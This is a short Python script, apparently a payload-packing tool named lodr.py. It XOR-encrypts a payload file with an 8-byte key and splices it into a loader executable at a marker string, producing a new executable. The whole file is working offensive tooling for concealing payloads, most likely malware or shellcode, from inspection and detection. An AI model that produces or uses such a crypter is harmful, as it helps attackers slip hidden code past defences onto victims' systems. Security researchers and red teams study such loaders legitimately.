#!/usr/bin/python3

import binascii, sys

def main():
    if len(sys.argv) != 5:
        print("usage: lodr.py <8-byte key> <payload> <lodr.exe> <output.exe>")
        sys.exit()

    key = bytes(sys.argv[1], 'latin')
    if 8 != len(key):
        print('[!] Error, key must be 8-bytes.')
        sys.exit(1)

    try:
        p = open(sys.argv[2], 'rb').read()
    except:
        print('[!] Error, unable to read payload file.')
        sys.exit(1)

    try:
        s = open(sys.argv[3], 'rb').read()
    except:
        print('[!] Error, unable to read lodr file.')
        sys.exit(1)

    pos = s.find(b'LODRRDOL')
    if -1 == pos:
        print('[!] Cannot find offset marker!')
        sys.exit()

    print('[*] Offset marker position:', pos)

    try:
        o = open(sys.argv[4], 'wb')
    except:
        print('[!] Error, unable to open output file.')
        sys.exit(1)

    enc_payload = b''

    # encrypt payload
    i = 0
    for b in p:
        enc_payload += bytes(chr(b ^ key[i % 8]), 'latin')
        i += 1

    #enc_payload = binascii.hexlify(enc_payload)

    print('[*] Payload length:', len(enc_payload))

    out = s[:pos] + enc_payload + s[pos + len(enc_payload):]
    print('[*] Total length:', len(out))
    o.write(out)

    print('[*] Payload written to:', sys.argv[4])

if __name__ == '__main__':
    main()